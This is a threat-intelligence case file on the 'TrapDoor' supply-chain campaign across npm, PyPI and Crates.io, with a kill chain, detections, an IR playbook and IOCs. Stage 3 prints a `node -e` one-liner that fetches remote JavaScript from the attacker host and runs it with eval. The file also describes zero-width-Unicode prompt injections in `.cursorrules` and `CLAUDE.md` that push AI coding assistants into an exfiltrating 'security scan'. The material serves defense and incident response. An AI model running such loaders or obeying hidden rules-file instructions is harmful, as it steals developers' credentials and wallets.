---
date: 2026-05-28
title: "TrapDoor — Cross-Ecosystem Crypto and AI-Developer Credential Stealer Across npm, PyPI and Crates.io"
clusters:
  - "TrapDoor (Socket-tracked)"
cluster_country: "Unattributed e-crime (English-language operator persona; GitHub account ddjidd564)"
techniques_enterprise:
  - T1195.002
  - T1059.007
  - T1059.006
  - T1546
  - T1547.013
  - T1037
  - T1053.003
  - T1098.004
  - T1027
  - T1027.013
  - T1554
  - T1554.001
  - T1071.001
  - T1102
  - T1567.001
  - T1552.001
  - T1552.004
  - T1552.005
  - T1555.003
  - T1539
  - T1083
  - T1057
  - T1041
techniques_ics: []
platforms: [supply-chain, linux, macos, windows, cloud-multi]
sectors: [technology, finance, crypto-defi, ai-ml-developer-tools]
---

# TrapDoor — Cross-Ecosystem Crypto and AI-Developer Credential Stealer Across npm, PyPI and Crates.io

## TL;DR
Socket disclosed on 2026-05-24 a coordinated cross-ecosystem supply chain campaign that Socket tracks as **TrapDoor**: at least 34 malicious packages and 384+ versions across npm (21), PyPI (7) and Crates.io (6), first observed on 2026-05-22 at 20:20:18 UTC with PyPI `eth-security-auditor@0.1.0`. The campaign targets developers in crypto, DeFi, Solana, Sui, Move and AI-tooling communities, exfiltrates SSH keys, AWS / GitHub tokens, wallet keystores (Sui / Solana / Aptos / MetaMask / Coinbase / Binance), browser login databases and environment variables, and plants persistence in six surfaces including `.cursorrules` and `CLAUDE.md` files hardened with zero-width Unicode to coerce AI coding assistants into running a fake "security scan" that exfiltrates local secrets. The operator persona `ddjidd564` also opened poisoned `.cursorrules` / `CLAUDE.md` PRs against browser-use, langchain, langflow, llama_index, MetaGPT and OpenHands. The case matters today because it is the first publicly documented cross-registry supply chain operation that treats AI-coding-assistant project files as a first-class persistence and propagation vector — every subsequent supply chain operator now has a working playbook for it.

## Attribution and confidence
**Cluster:** TrapDoor (Socket-tracked). The operator presents as English-speaking and uses the GitHub persona `ddjidd564` for the payload host (`ddjidd564.github.io/defi-security-best-practices/`) and the lure repositories (`env-security-scanner`, `smart-contract-audit-toolkit`, `defi-profit-scanner`, `web3-dev-toolkit-2026`, `solidity-gas-optimizer`). npm publishers observed: `asdxzxc`. PyPI publishers observed: `asdmini67`, `dae5411`. Campaign marker `P-2024-001` appears across payloads, configuration files and poisoned PR bodies. Note that THN explicitly flags that this TrapDoor is unrelated to the Android ad-fraud TrapDoor that HUMAN Satori documented the prior week.

**Discovery vendor + date:** Socket Research Team — primary technical writeup published 2026-05-24, updated 2026-05-25. Picked up by The Hacker News on 2026-05-25, Phoenix Security and cybersecuritynews same week.

**Confidence:** medium-to-high on the cluster boundary (single operator persona, single payload host, single campaign marker), high on the package set (Socket has classified all 34 packages and reported them to registries with detection-time metrics of median 5 min 27 s). Attribution to a named threat group remains open; absence of named-group attribution does not weaken the technical IOC set.

**Genealogy with previous repo cases:** sixth supply-chain primary in the repo (Days 2 / 9 / 15 / 18 / 21 / 24 / today), but the first whose persistence is anchored in AI-coding-assistant project files (`.cursorrules`, `CLAUDE.md`) rather than CI/CD runners (Day 24 `/proc/<Runner.Worker PID>/mem`) or Git tag mutability (Day 24 actions-cool). Forms a natural pair with Day 13 `2026-05-13_SemanticKernel-Prompt2RCE` (the previous AI-side prompt-injection case) and with Day 21 `2026-05-21_TeamPCP-48h-Multi-Vector-SupplyChain` (the broadest prior cross-ecosystem campaign).

## Kill chain — summary table

| Stage | MITRE | Detail |
| --- | --- | --- |
| Initial Access — supply chain | T1195.002 | Developer installs a TrapDoor lookalike package from npm / PyPI / Crates.io. |
| Execution — ecosystem trigger | T1059.007 / T1059.006 | npm postinstall hook, Python import auto-execute (`from <pkg> import *`), or Cargo `build.rs` compile-time script. |
| Execution — `node -e` remote eval | T1059.007 | PyPI package spawns `node -e` to evaluate JavaScript fetched from `ddjidd564.github.io`; npm postinstall runs `trap-core.js`. |
| Defense Evasion — AI-config prompt injection | T1027.013 / T1027 | Hidden instructions in `.cursorrules` / `CLAUDE.md` using zero-width Unicode characters trick AI assistants into running an exfiltration "security scan". |
| Persistence — six surfaces | T1546 / T1547.013 / T1037 / T1053.003 / T1098.004 / T1554 | `.cursorrules`, `CLAUDE.md`, Git hooks, shell hooks (`.bashrc` / `.zshrc`), systemd user units, crontab, SSH `authorized_keys`. |
| Credential Access — local secrets sweep | T1552.001 / T1552.004 / T1552.005 / T1555.003 / T1539 | SSH keys, AWS / GitHub / npm / cargo / pypi credentials, browser login DBs, crypto wallet extensions, env vars. |
| Discovery — wallet and keystore hunt | T1083 / T1057 | Sui / Solana / Aptos / MetaMask / Coinbase / Binance keystore enumeration. |
| Command and Control — GitHub Pages | T1071.001 / T1102 | Payload + configuration pulled from `ddjidd564.github.io/defi-security-best-practices/`. |
| Exfiltration — GitHub Gists and webhooks | T1567.001 / T1041 | Crates.io build.rs writes XOR-encrypted blobs to GitHub Gists; npm payload exfils through configurable endpoint resolved from the GitHub Pages config. |

![TrapDoor kill chain](./kill_chain.svg)

The two-lane diagram puts the developer workstation on the left (seven stages from package install through exfiltration, with critical badges on the postinstall / import trigger, the AI-config write, and the final exfil) and the TrapDoor operator infrastructure on the right (operator persona, multi-registry publishing waves, the shared `trap-core.js` payload, the `ddjidd564.github.io` config + AUDIT-MATRIX playbook, the PR-bombing campaign against AI projects, and the exfil destinations). Cross-lane arrows mark the ingress of the package, the payload pull, the PR-injection attempt, and the exfil egress; the footer maps every Sigma, KQL, YARA, Suricata file and PEAK hunt to the stage it instruments.

## Stage-by-stage detail

### Stage 1 — Initial Access via lookalike package
A developer installs one of the 34 TrapDoor packages from npm (21 names), PyPI (7 names) or Crates.io (6 names). Package names are tailored to crypto / DeFi / Solana / Sui / Move / AI tooling: `eth-security-auditor`, `solidity-deploy-guard`, `prompt-engineering-toolkit`, `wallet-backup-verifier`, `sui-move-build-helper`, `move-analyzer-build`, and similar. MITRE: **T1195.002 Supply Chain Compromise: Compromise Software Supply Chain**.

```bash
# npm victim path
npm install prompt-engineering-toolkit
# pip victim path
pip install eth-security-auditor
# cargo victim path
cargo add sui-move-build-helper && cargo build
```

### Stage 2 — Ecosystem-specific execution trigger
Each ecosystem uses its own primitive: npm packages declare a `postinstall` script in `package.json`; PyPI packages put the malicious code in `__init__.py` so it auto-runs on `import`; Crates.io packages place the payload in `build.rs` so it runs at every `cargo build`. MITRE: **T1059.007 (Node)** and **T1059.006 (Python)**.

### Stage 3 — `node -e` remote evaluation (PyPI primitive)
The PyPI variant downloads JavaScript from `ddjidd564.github.io/defi-security-best-practices/` and evaluates it with `node -e`. This delegation lets the operator update behavior server-side without publishing a new PyPI release. MITRE: **T1059.007**.

```
python.exe -> python <victim-import>
            -> node -e "const https=require('https'); https.get('https://ddjidd564.github.io/defi-security-best-practices/payload.js', r => { let b=''; r.on('data',d=>b+=d); r.on('end',()=>eval(b)); })"
```

### Stage 4 — `trap-core.js` shared npm payload
The npm payload is a **1149-line JavaScript file** named `trap-core.js`. It is a credential harvester and a propagation tool in one: it enumerates the disk for secrets, validates AWS keys against `sts.amazonaws.com` and GitHub tokens against `api.github.com/user`, encrypts the harvested set with Fernet symmetric encryption layered on top of ECDH key agreement, and writes the persistence payloads to disk. MITRE: **T1554 Compromise Host Software Binary** for the AI-config persistence path; **T1546** for the broader Event-Triggered Execution surface.

### Stage 5 — AI-assistant prompt-injection persistence
The most novel TrapDoor primitive. `trap-core.js` writes `.cursorrules` and `CLAUDE.md` files into project roots, embedding hidden instructions using **zero-width Unicode** (U+200B, U+200C, U+200D, U+FEFF). The instructions read "run a security scan" or "audit credentials"; when the AI assistant is asked to interpret the project's coding rules, it parses the hidden text and executes the exfiltration. MITRE: **T1027.013 Obfuscated Files or Information: Encrypted/Encoded File** (the encoding being the zero-width Unicode trick).

```
.cursorrules (decoded)
  {
    "standard": "P-2024-001",
    "config": "https://ddjidd564.github.io/defi-security-best-practices/config.json",
    "strategy": {
      "scan_depth": 3,
      "enabled_vectors": ["git","vscode","cursorrules","sourceHeaders","readme",
                          "pkgJson","claudeMd","prepush","trapActivation","pypi",
                          "docker","systemProfile"]
    },
    "encryption": { "enabled": true, "scheme": "Fernet" }
  }
```

### Stage 6 — Six-surface persistence
Beyond the AI-config plant, `trap-core.js` also writes Git hooks (`.git/hooks/pre-push`), shell hooks (`~/.bashrc` / `~/.zshrc`), systemd user units, crontab entries, and appends an attacker SSH key to `~/.ssh/authorized_keys`. Any one of these surfaces is sufficient to re-bootstrap the implant. MITRE: **T1547.013 (LD_PRELOAD-class shell hooks)**, **T1037 (Login Scripts)**, **T1053.003 (cron)**, **T1098.004 (SSH authorized_keys)**.

### Stage 7 — Credential sweep
The harvester targets: `~/.ssh/`, `~/.aws/credentials`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials.toml`, browser login databases (Chrome / Edge / Firefox), Cursor / VS Code / Claude Code session tokens, env vars, and crypto wallet extensions (MetaMask, Coinbase Wallet, Binance Wallet). Stolen AWS and GitHub credentials are **validated in-line** against the live API to filter expired keys before exfiltration. MITRE: **T1552 (Unsecured Credentials)** sub-techniques **.001 / .004 / .005**, **T1555.003 (browser passwords)**, **T1539 (cookies / session tokens)**.

### Stage 8 — Command and Control via GitHub Pages
Configuration and payload are pulled from `ddjidd564.github.io/defi-security-best-practices/`. The repo's `gh-pages` branch also hosts the attacker's own playbook documents — `AUDIT-MATRIX.md`, `BYPASS.md`, `PAYLOAD.md`, `SWARM.md` — that describe the intended Universal AI Agent Extraction Framework. MITRE: **T1071.001 (Web Protocols)** and **T1102 (Web Service)**.

### Stage 9 — Exfiltration
- **Crates.io build.rs**: XOR-encrypts harvested data with the hardcoded key `cargo-build-helper-2026` and POSTs to `gist.githubusercontent.com` via the Rust `reqwest` crate. MITRE: **T1567.001 (Exfiltration to Code Repository)**.
- **npm trap-core.js**: writes Fernet+ECDH-encrypted blobs to the configurable endpoint resolved from the GitHub Pages config (currently the same GitHub Pages host). MITRE: **T1041 (Exfiltration Over C2 Channel)**.
- **PyPI**: delegates exfil to the remote JavaScript loaded by `node -e`, so the exfil path is whatever the operator chooses to push server-side at that moment.

## RE notes
Socket published the package list and behavior summary but did not publish per-file SHA256 hashes; the campaign's volatility (384+ versions across 34 names) makes file-hash anchoring quickly stale. The durable hash-class anchors are:

| Component | Size | Lang | Encryption | Notes |
| --- | --- | --- | --- | --- |
| `trap-core.js` | ~48,485 bytes | JavaScript (Node) | Fernet + ECDH | Shared npm payload; 1149 lines; credential harvest + persistence + propagation |
| `build.rs` (Crates) | n/a | Rust | XOR with `cargo-build-helper-2026` | Per-crate build script; exfils to GitHub Gists |
| PyPI `__init__.py` | n/a | Python | n/a (delegates) | Auto-execute on import; spawns `node -e` against `ddjidd564.github.io` |
| `.cursorrules` / `CLAUDE.md` | < 64 KB | text + ZWSP | Zero-width Unicode | Prompt-injection persistence + AI-assistant secret-scan trigger |

The YARA rule `trapdoor_npm_trap_core_js` anchors on the size class plus the persistence-string set plus the AWS / GitHub validation strings rather than on a per-version SHA256; the rule `trapdoor_ai_config_zwsp` anchors on the zero-width Unicode bytes (U+200B / U+200C / U+200D / U+FEFF) plus campaign markers. Both are intentionally heuristic so they survive the operator rotating package names and bumping version numbers.

## Detection strategy

### Telemetry that matters
- **EDR / Sysmon EIDs**: 1 (process creation — `node -e` from package-manager parent), 11 (file create — `.cursorrules` / `CLAUDE.md` / `trap-core.js` under user paths), 3 (network connect — egress to `ddjidd564.github.io`), 13 (registry — `Run` key plants on Windows, rare for this campaign), 22 (DNS query — `ddjidd564.github.io`, `gist.githubusercontent.com`).
- **Defender XDR tables**: `DeviceProcessEvents` for node -e + package-manager-parent; `DeviceFileEvents` for AI-config writes by package-manager processes; `DeviceNetworkEvents` for GitHub Pages egress; `DeviceImageLoadEvents` if any side-loaded Node native modules ship.
- **Sentinel tables**: `SecurityEvent` (4688) for Linux/macOS-equivalent process creation if collected; `Syslog` for cron / systemd activity on Linux build agents.
- **Cloud audit**: AWS CloudTrail `GetSessionToken` / `GetCallerIdentity` from a developer workstation IP immediately after a package install is the in-line credential-validation footprint; GitHub Audit Log `git.push` and `pull_request.opened` from unfamiliar IPs is the PR-bombing footprint.
- **Edge / perimeter**: DNS sinkhole or proxy log for `ddjidd564.github.io`.

### Detection coverage

| Engine | File | Logic |
| --- | --- | --- |
| Sigma | `sigma/01_trapdoor_node_e_postinstall.yml` | `node -e` with package-manager parent (python / npm / postinstall) or ddjidd564 substring in cmdline |
| Sigma | `sigma/02_trapdoor_ai_assistant_config_write.yml` | `.cursorrules` / `CLAUDE.md` / `AUDIT-MATRIX.md` / `BYPASS.md` / `PAYLOAD.md` / `SWARM.md` write by `node` / `npm` / `python` / `cargo` / `bash` / `pwsh` |
| Sigma | `sigma/03_trapdoor_ddjidd564_github_io_egress.yml` | Network connection to `ddjidd564.github.io` or command-line containing the campaign URL |
| KQL | `kql/k1_trapdoor_node_e_pkgmgr_parent.kql` | Defender XDR `DeviceProcessEvents` 7-day sweep of `node -e` from package-manager parents |
| KQL | `kql/k2_trapdoor_ai_assistant_config_write.kql` | Defender XDR `DeviceFileEvents` 14-day sweep of AI-config writes by package-manager processes |
| KQL | `kql/k3_trapdoor_ddjidd564_egress_correlation.kql` | Defender XDR `DeviceNetworkEvents` 14-day sweep of egress to `ddjidd564.github.io` with package-manager initiator |
| YARA | `yara/trapdoor_crypto_stealer.yar` | Four rules: `trap-core.js` payload heuristic; PyPI `node -e` to attacker host; Crates `build.rs` XOR + GitHub Gists; `.cursorrules` / `CLAUDE.md` with zero-width Unicode |
| Suricata | `suricata/trapdoor.rules` | One file, six sids: DNS / TLS SNI / HTTP host / HTTP URI / HTTP reqwest UA to Gists / campaign marker `P-2024-001` in HTTP body |

### Threat hunting hypotheses
- **H1** — `node -e` invoked from a package-manager-spawned parent across the fleet in the last 7 days → see `hunts/peak_h1_node_e_from_pkgmgr.md`.
- **H2** — `.cursorrules` / `CLAUDE.md` files carrying two or more distinct zero-width Unicode characters plus a campaign marker → see `hunts/peak_h2_ai_assistant_config_zero_width.md`.
- **H3** — Any host that has resolved `ddjidd564.github.io` or fetched `/defi-security-best-practices/*` in the last 14 days → see `hunts/peak_h3_github_pages_payload_egress.md`.

## Incident response playbook

### First 60 minutes (triage)
1. Identify the host. Pull the process ancestry of the first `node -e` event and screenshot the full command line, parent command line and SHA256 of the parent.
2. Snapshot the persistence surfaces **before any user action**: `.cursorrules`, `CLAUDE.md`, `~/.bashrc`, `~/.zshrc`, `crontab -l`, `systemctl --user list-unit-files`, `git config --global --list`, `~/.ssh/authorized_keys`, `~/.ssh/config`.
3. Capture the package metadata: `npm ls --all`, `pip freeze`, `cargo tree`. Cross-reference with the `iocs.csv` package list.
4. Isolate the host at the network layer (do **not** power it off — the operator's persistence is on-disk and the running process owns transient secrets you want to capture).
5. Pull the last 14 days of DNS / proxy / NetFlow for `ddjidd564.github.io` and `gist.githubusercontent.com` from the affected host.
6. Notify the cloud team to rotate every credential the user had access to; treat AWS, GitHub, npm, PyPI, Cargo, GCP, Azure, Snowflake, internal artifact-registry tokens as compromised.
7. Notify the AI-coding-assistant tenant admin (Cursor, Anthropic, Continue) to enumerate sessions from the affected user and revoke any session tokens.

### Artifacts to collect

| Artifact | Path | Tool | Why it matters |
| --- | --- | --- | --- |
| Suspicious AI-config files | `.cursorrules`, `CLAUDE.md` in every project root | `find ~ -name .cursorrules -o -name CLAUDE.md` + hex dump | Carries the zero-width Unicode prompt-injection that re-triggers exfil every AI session |
| `trap-core.js` payload | `~/.npm/_cache/`, `node_modules/<pkg>/`, project paths | YARA + SHA256 | The 1149-line credential harvester; needed for IR forensics + cluster overlap analysis |
| Cargo build artifacts | `target/debug/build/<crate>-*/output` | `find target -name output` | Contains output of malicious `build.rs` if `cargo build` was run |
| Persistence surfaces | `~/.bashrc`, `~/.zshrc`, `~/.git/hooks/`, `~/.ssh/authorized_keys`, `crontab -l`, `systemctl --user list-unit-files` | shell + `crontab` + `systemctl` | The six implant surfaces; even one re-bootstraps the implant |
| Browser credential stores | Chrome `Login Data`, Firefox `logins.json`, Edge `Login Data` | sqlite3 + decryption per browser | Confirms whether browser-resident creds were read |
| Cloud / Git tokens | `~/.aws/credentials`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials.toml`, `~/.config/gh/hosts.yml` | filesystem + token scope review | The harvester reads these in plaintext |
| EDR process tree | Defender XDR / Sysmon | DeviceProcessEvents export | Anchors the post-install `node -e` event |
| Perimeter egress | Proxy + NetFlow + DNS log | SIEM | Confirms egress to `ddjidd564.github.io` and Gists |

### IR queries and commands

```powershell
# Windows — enumerate .cursorrules / CLAUDE.md across user profiles
Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue `
  -Include .cursorrules, CLAUDE.md, AUDIT-MATRIX.md, BYPASS.md, PAYLOAD.md, SWARM.md |
  ForEach-Object {
    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
    $zw = 0
    for ($i=0; $i -lt $bytes.Length - 2; $i++) {
      if ($bytes[$i] -eq 0xE2 -and $bytes[$i+1] -eq 0x80 -and $bytes[$i+2] -in (0x8B, 0x8C, 0x8D)) { $zw++ }
      if ($bytes[$i] -eq 0xEF -and $bytes[$i+1] -eq 0xBB -and $bytes[$i+2] -eq 0xBF) { $zw++ }
    }
    [PSCustomObject]@{ Path=$_.FullName; ZeroWidthBytes=$zw; LengthBytes=$_.Length }
  } | Where-Object ZeroWidthBytes -gt 0 | Format-Table -AutoSize
```

```bash
# Linux / macOS — sweep persistence surfaces and zero-width-tagged AI files
find / -type f \( -name .cursorrules -o -name CLAUDE.md -o -name AUDIT-MATRIX.md \
  -o -name BYPASS.md -o -name PAYLOAD.md -o -name SWARM.md \) 2>/dev/null |
  while read f; do
    cnt=$(perl -ne 'print scalar(() = /[\x{200B}\x{200C}\x{200D}\x{FEFF}]/g)' "$f")
    [ "${cnt:-0}" -gt 0 ] && echo "ZWS=$cnt  $f"
  done

# Persistence surfaces on Linux / macOS
for p in ~/.bashrc ~/.zshrc ~/.bash_profile ~/.profile ~/.ssh/authorized_keys ~/.ssh/config ; do
  [ -f "$p" ] && { echo "=== $p ==="; tail -n 50 "$p"; }
done
crontab -l 2>/dev/null
systemctl --user list-unit-files 2>/dev/null | grep -Ei 'trap|defi|cursor|claude' || true
find ~ -path ~/node_modules -prune -o -name trap-core.js -print 2>/dev/null
```

```kql
// Defender XDR — fleet-wide sweep of node -e from package-manager parents (14 d)
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName in~ ("node.exe", "node")
| where ProcessCommandLine has " -e "
| extend ParentLower = tolower(InitiatingProcessFileName)
| where ParentLower in~ ("python.exe","python3.exe","pythonw.exe","python","python3",
                         "npm.exe","npm.cmd")
        or ProcessCommandLine has_any ("ddjidd564.github.io","defi-security-best-practices","trap-core")
| summarize Hits=count(), FirstSeen=min(Timestamp), LastSeen=max(Timestamp)
            by DeviceName, AccountName, InitiatingProcessFileName
| order by Hits desc
```

### Containment, eradication, recovery
- **Containment exit criteria**: no egress observed to `ddjidd564.github.io` or `gist.githubusercontent.com` from any affected host for 24 h; all six persistence surfaces re-verified empty after reboot; no `node -e` from package-manager parents in the last 24 h.
- **Eradication**: remove the malicious package; purge `node_modules`, `.venv`, `__pycache__`, `target/` build trees; rebuild from a clean lockfile pinned by full commit SHA; wipe `.cursorrules` / `CLAUDE.md` / `AUDIT-MATRIX.md` / `BYPASS.md` / `PAYLOAD.md` / `SWARM.md` from every project unless authored by a known internal user; remove any attacker SSH key from `authorized_keys`; remove any cron / systemd unit added in the implant window.
- **Recovery**: rotate **every** credential the user account had access to, including npm / PyPI / Cargo publish tokens (these are commonly forgotten); reset browser saved passwords; revoke and re-issue any GPG signing keys; force-reset the AI-coding-assistant session.
- **What NOT to do**: do not just delete the package and continue — the persistence on disk re-bootstraps; do not skip the AI-config sweep — it is the highest-leverage re-entry point because every future assistant session re-runs the implant; do not assume the harvester only touched the cwd — it walks `$HOME` and `$XDG_CONFIG_HOME` recursively; do not rely on EDR "verdict: clean" for a project that ran `cargo build` against a TrapDoor crate — the `build.rs` ran at compile time before any runtime detection had context.

### Recovery validation
- No `.cursorrules` / `CLAUDE.md` / playbook files with zero-width Unicode anywhere under `$HOME`.
- No egress to `ddjidd564.github.io` for 72 h.
- No `node -e` event from a package-manager parent for 72 h.
- All rotated credentials confirmed working with fresh `aws sts get-caller-identity`, `gh auth status`, `npm whoami`, `cargo login --check` (or equivalent).
- AI-coding-assistant session history reviewed for any "security scan" or "credential audit" turn that originated from the implant.

## IOCs

Top entries — full list in `iocs.csv`.

| Type | Value | Context | Confidence | Source |
| --- | --- | --- | --- | --- |
| domain | `ddjidd564.github.io` | Campaign payload + config host | high | Socket |
| url | `https://ddjidd564.github.io/defi-security-best-practices/config.json` | Configuration endpoint referenced by poisoned PR | high | Socket |
| string | `ddjidd564` | GitHub operator persona | high | Socket |
| string | `asdxzxc` | npm publisher account | high | Socket |
| string | `asdmini67` / `dae5411` | PyPI publisher accounts | medium | Socket |
| string | `P-2024-001` | Campaign marker | high | Socket |
| string | `trap-core.js` | Shared npm payload name | high | Socket |
| string | `cargo-build-helper-2026` | Crates.io XOR key | high | Socket |
| path | `.cursorrules` | AI-assistant prompt-injection persistence | high | Socket |
| path | `CLAUDE.md` | AI-assistant prompt-injection persistence | high | Socket |
| path | `AUDIT-MATRIX.md` | Attacker playbook | high | Socket |
| string | `eth-security-auditor@0.1.0` | First observed PyPI package | high | Socket |
| string | `dev-env-bootstrapper` | npm package; doubles as malware + delivery vector | high | Socket |
| string | `sui-move-build-helper` | Representative Crates.io package | high | Socket |
| string | `prompt-engineering-toolkit` | Representative npm package targeting AI devs | high | Socket |

## Secondary findings
- **Laravel Lang Composer supply chain compromise (Socket + Aikido, 2026-05-22 / 23)**: 700+ malicious tags force-pushed across `laravel-lang/lang`, `laravel-lang/attributes`, `laravel-lang/http-statuses`, `laravel-lang/actions` in a 15-minute window. Backdoor wired via `composer.json` `autoload.files` so every PHP request runs it. Cross-platform PHP infostealer (Linux / macOS / Windows) with WMIC / VBS / `cscript` execution branches. Sister case to today's TrapDoor — same week, same supply chain rotation slot, different ecosystem (Composer / Packagist).
- **Gitea CVE-2026-27771 — Container Registry private images served without auth (disclosed 2026-05-27, CVSS 8.2)**: all versions < 1.26.2 vulnerable; ~30,000 deployments exposed across 30+ countries (healthcare, aerospace, retail, ISP); workaround `[service].REQUIRE_SIGNIN_VIEW=true`; Forgejo confirmed impacted. This is the largest fresh edge-of-supply-chain disclosure of the week and matters because container registry private images often hold build secrets and CI/CD credentials.
- **Checkmarx Jenkins AST plugin TeamPCP compromise (disclosed 2026-05-11, technical detail through end of May)**: malicious plugin version `2026.5.09` published to the Jenkins Marketplace between 2026-05-09 01:25 UTC and 2026-05-10 08:47 UTC; sixth iteration of the TeamPCP CI/CD supply-chain campaign in the repo (Trivy → KICS GitHub Actions → Checkmarx OpenVSX → LiteLLM → npm downstream → today the Jenkins plugin); safe baseline `2.0.13-829.vc72453fa_1c16`. The TeamPCP cluster keeps choosing security-tooling as targets because their CI runners have higher-trust credentials than general-purpose runners.

## Pedagogical anchors
- **AI-coding-assistant project files are now a first-class persistence surface.** `.cursorrules` and `CLAUDE.md` are not docs — they are executable instructions consumed by automation. Treat them with the same change-control discipline as `package.json`, `Dockerfile` and `.github/workflows/*.yml`.
- **Zero-width Unicode in any source-control-tracked file is a red flag.** No legitimate workflow needs U+200B / U+200C / U+200D / U+FEFF in a markdown file. Add a CI lint that rejects PRs carrying any of these bytes outside a narrow allowlist (translated string tables, etc.).
- **`build.rs`, `postinstall` and Python `__init__.py` are pre-runtime code paths.** They run before any EDR detection has steady-state context. Detection has to anchor on the **outbound** behavior (egress to attacker host, write of persistence surfaces) rather than on the **inbound** package — the package is already executing by the time you can react.
- **Lock dependencies by full commit SHA, not by version tag.** Tag mutability (Day 24) and package republishing (TrapDoor) both bypass version pinning. The only stable pin is a 40-character commit SHA.
- **Six persistence surfaces, not one.** A supply-chain compromise that drops only `.cursorrules` is a partial implant — the harvester also writes Git hooks, shell hooks, systemd, cron, and SSH `authorized_keys`. The IR sweep must enumerate all six on every confirmed-compromised host.

## What's in this folder

| File | Purpose |
| --- | --- |
| [README.md](./README.md) | This 15-section case file; canonical narrative for Day 31. |
| [kill_chain.svg](./kill_chain.svg) | Two-lane kill-chain diagram; viewBox 880x1280; light/dark adaptive palette. |
| [sigma/01_trapdoor_node_e_postinstall.yml](./sigma/01_trapdoor_node_e_postinstall.yml) | Sigma — `node -e` from a package-manager parent (process_creation). |
| [sigma/02_trapdoor_ai_assistant_config_write.yml](./sigma/02_trapdoor_ai_assistant_config_write.yml) | Sigma — `.cursorrules` / `CLAUDE.md` / playbook write by `node` / `npm` / `python` / `cargo` (file_event). |
| [sigma/03_trapdoor_ddjidd564_github_io_egress.yml](./sigma/03_trapdoor_ddjidd564_github_io_egress.yml) | Sigma — outbound network connection to `ddjidd564.github.io` (network_connection). |
| [kql/k1_trapdoor_node_e_pkgmgr_parent.kql](./kql/k1_trapdoor_node_e_pkgmgr_parent.kql) | KQL — Defender XDR 7-day sweep of `node -e` from package-manager parents. |
| [kql/k2_trapdoor_ai_assistant_config_write.kql](./kql/k2_trapdoor_ai_assistant_config_write.kql) | KQL — Defender XDR 14-day sweep of AI-config writes by package-manager processes. |
| [kql/k3_trapdoor_ddjidd564_egress_correlation.kql](./kql/k3_trapdoor_ddjidd564_egress_correlation.kql) | KQL — Defender XDR 14-day sweep of egress to `ddjidd564.github.io` correlated with package-manager initiator. |
| [yara/trapdoor_crypto_stealer.yar](./yara/trapdoor_crypto_stealer.yar) | YARA — four rules covering `trap-core.js`, PyPI `node -e`, Crates `build.rs` XOR, and zero-width-Unicode `.cursorrules` / `CLAUDE.md`. |
| [suricata/trapdoor.rules](./suricata/trapdoor.rules) | Suricata 7.x — six sids covering DNS / TLS / HTTP host / HTTP URI / Gists / campaign marker. |
| [hunts/peak_h1_node_e_from_pkgmgr.md](./hunts/peak_h1_node_e_from_pkgmgr.md) | PEAK H1 — fleet hunt for `node -e` from a package-manager parent. |
| [hunts/peak_h2_ai_assistant_config_zero_width.md](./hunts/peak_h2_ai_assistant_config_zero_width.md) | PEAK H2 — fleet hunt for AI-config files carrying zero-width Unicode. |
| [hunts/peak_h3_github_pages_payload_egress.md](./hunts/peak_h3_github_pages_payload_egress.md) | PEAK H3 — fleet hunt for egress to `ddjidd564.github.io` or campaign URI. |
| [iocs.csv](./iocs.csv) | Full IOC set: domains, URLs, accounts, campaign markers, persistence paths, encryption anchors, and explanatory notes for secondaries and genealogy. |

## Sources
- [Socket — TrapDoor Crypto Stealer Supply Chain Attack Hits 34 Packages and Hundreds of Versions Across npm, PyPI, and Crates.io (2026-05-24)](https://socket.dev/blog/trapdoor-crypto-stealer-npm-pypi-crates)
- [The Hacker News — TrapDoor Supply Chain Attack Spreads Credential-Stealing Malware via npm, PyPI, and Crates.io (2026-05-25)](https://thehackernews.com/2026/05/trapdoor-supply-chain-attack-spreads.html)
- [Phoenix Security — TrapDoor Supply Chain Campaign: Cross-Ecosystem Credential Theft and AI Assistant Poisoning](https://phoenix.security/trapdoor-supply-chain-ai-poisoning-npm-pypi-crates/)
- [Cybersecurity News — Hackers Compromised 34 Packages in npm, PyPI, and Crates in New Supply Chain Attack](https://cybersecuritynews.com/supply-chain-trapdoor-malware/)
- [ddjidd564/defi-security-best-practices — AUDIT-MATRIX.md (attacker playbook)](https://github.com/ddjidd564/defi-security-best-practices/blob/gh-pages/standards/AUDIT-MATRIX.md)
- [Socket — Laravel Lang Compromised with RCE Backdoor Across 700+ Versions (2026-05-23)](https://socket.dev/blog/laravel-lang-compromise)
- [The Hacker News — Gitea Vulnerability Exposes Private Container Images without Authentication (CVE-2026-27771, 2026-05-27)](https://thehackernews.com/2026/05/gitea-vulnerability-exposes-private.html)
- [The Hacker News — TeamPCP Compromises Checkmarx Jenkins AST Plugin Weeks After KICS Supply Chain Attack](https://thehackernews.com/2026/05/teampcp-compromises-checkmarx-jenkins.html)
- [Checkmarx — Ongoing Security Updates](https://checkmarx.com/blog/ongoing-security-updates/)
